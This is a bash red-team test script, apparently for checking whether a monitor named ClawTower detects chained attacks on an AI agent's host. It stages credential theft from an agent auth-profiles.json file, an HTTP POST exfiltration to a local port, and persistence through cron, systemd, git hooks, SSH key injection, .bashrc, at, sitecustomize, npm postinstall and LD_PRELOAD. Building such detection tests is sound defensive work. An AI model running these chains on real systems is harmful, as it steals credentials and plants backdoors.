#!/usr/bin/env bash
# Red Lobster v6 — Flag 13: CHAIN ATTACKS — Multi-step attacks that look individually benign
# NEW in v6. Tests whether ClawTower correlates events across time.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag13" "Flag 13: CHAIN ATTACKS — Multi-step individually-benign attacks (v6)"

CRED="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
OUTDIR="$FLAG_DIR"

# 1. Recon → Stage → Exfil (3-step)
# Step 1: innocent recon (find)
# Step 2: innocent copy to /tmp
# Step 3: innocent http POST of /tmp file
rl_run "3-step recon→stage→exfil" \
  "find /home/openclaw/.openclaw -name 'auth-profiles.json' > '$OUTDIR/13_1_recon.txt' 2>/dev/null; \
   cp '$CRED' '$OUTDIR/13_1_staged.json' 2>/dev/null; \
   python3 -c \"
import http.client
try:
    c = http.client.HTTPConnection('127.0.0.1', 19999, timeout=2)
    c.request('POST', '/', open('$OUTDIR/13_1_staged.json','rb').read())
except: pass
\" 2>/dev/null"

# 2. Write crontab → crontab loads script → script does exfil
rl_run "crontab persistence → exfil" \
  "echo '* * * * * cat $CRED > /tmp/rl6_cron_exfil.txt' | crontab - 2>/dev/null; sleep 1; crontab -r 2>/dev/null"

# 3. Create user service → service reads secrets
rl_run "systemd user service persistence" \
  "mkdir -p ~/.config/systemd/user; \
   cat > ~/.config/systemd/user/rl6-exfil.service <<EOF
[Unit]
Description=RL6 Test

[Service]
Type=oneshot
ExecStart=/bin/cat $CRED

[Install]
WantedBy=default.target
EOF
   systemctl --user daemon-reload 2>/dev/null; \
   sleep 1; \
   rm -f ~/.config/systemd/user/rl6-exfil.service; \
   systemctl --user daemon-reload 2>/dev/null"

# 4. Git hook persistence (post-commit runs arbitrary code)
rl_run "git hook persistence" \
  "mkdir -p '$OUTDIR/fakerepo/.git/hooks'; \
   echo '#!/bin/bash' > '$OUTDIR/fakerepo/.git/hooks/post-commit'; \
   echo 'cat $CRED > /tmp/rl6_git_exfil.txt' >> '$OUTDIR/fakerepo/.git/hooks/post-commit'; \
   chmod +x '$OUTDIR/fakerepo/.git/hooks/post-commit'; \
   sleep 1; rm -rf '$OUTDIR/fakerepo'"

# 5. SSH key injection (add attacker key to authorized_keys)
rl_run "SSH authorized_keys injection" \
  "echo 'ssh-ed25519 AAAAC3FAKE_ATTACKER_KEY_v6 attacker@evil' >> ~/.ssh/authorized_keys 2>/dev/null; \
   sleep 1; \
   sed -i '/FAKE_ATTACKER_KEY_v6/d' ~/.ssh/authorized_keys 2>/dev/null"

# 6. .bashrc injection (runs on next shell open)
rl_run ".bashrc injection" \
  "echo '# RL6 TEST' >> ~/.bashrc; \
   echo 'cat $CRED > /tmp/rl6_bashrc_exfil.txt 2>/dev/null' >> ~/.bashrc; \
   sleep 1; \
   sed -i '/RL6 TEST/d' ~/.bashrc; \
   sed -i '/rl6_bashrc_exfil/d' ~/.bashrc"

# 7. at job scheduling
rl_run "at job persistence" \
  "echo 'cat $CRED > /tmp/rl6_at_exfil.txt' | at now + 1 minute 2>/dev/null; \
   sleep 1; \
   atq 2>/dev/null | awk '{print \$1}' | xargs -I{} atrm {} 2>/dev/null"

# 8. Python sitecustomize persistence
rl_run "python sitecustomize persistence" \
  "PYDIR=$(python3 -c 'import site; print(site.getusersitepackages())' 2>/dev/null); \
   mkdir -p \"\$PYDIR\" 2>/dev/null; \
   echo 'import os; os.system(\"cat $CRED > /tmp/rl6_pysite_exfil.txt 2>/dev/null\")' > \"\$PYDIR/usercustomize.py\" 2>/dev/null; \
   sleep 1; \
   rm -f \"\$PYDIR/usercustomize.py\" 2>/dev/null"

# 9. npm postinstall hook
rl_run "npm postinstall hook" \
  "mkdir -p '$OUTDIR/npm_pkg'; \
   echo '{\"name\":\"rl6\",\"scripts\":{\"postinstall\":\"cat $CRED > /tmp/rl6_npm.txt\"}}' > '$OUTDIR/npm_pkg/package.json'; \
   sleep 1; rm -rf '$OUTDIR/npm_pkg'"

# 10. LD_PRELOAD in .profile
rl_run "LD_PRELOAD in .profile" \
  "echo 'export LD_PRELOAD=/tmp/evil.so' >> ~/.profile 2>/dev/null; \
   sleep 1; \
   sed -i '/LD_PRELOAD.*evil/d' ~/.profile 2>/dev/null"

rl_summary
rl_cleanup
